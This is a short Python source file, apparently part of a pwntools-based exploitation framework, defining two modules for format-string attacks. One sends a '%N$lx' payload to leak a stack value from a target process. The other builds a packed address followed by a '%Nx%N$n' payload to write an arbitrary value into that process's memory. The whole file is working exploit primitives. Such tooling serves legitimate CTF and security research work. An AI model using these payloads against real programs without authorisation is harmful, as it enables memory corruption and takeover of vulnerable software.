from pypwn.core.abstract.module import AbstractModule
from pypwn.core.abstract.process import AbstractProcess
from pwn import p64
from loguru import logger


class FormatStringMagicRead(AbstractModule):
    @classmethod
    def execute(cls, process: AbstractProcess, position: int, *args, **kwargs) -> int | None:
        logger.info(f"Running {cls.__name__} module")
        payload = f'%{position}$lx'.encode()
        response = process(payload)
        return int(response, 16)


class FormatStringMagicWrite(AbstractModule):
    @classmethod
    def execute(cls, process: AbstractProcess, position: int, value: int, address: int, *args, **kwargs) -> None:
        logger.info(f"Running {cls.__name__} module")
        payload = p64(address) + f'%{value-8}x%{position}$n'.encode()
        process(payload)
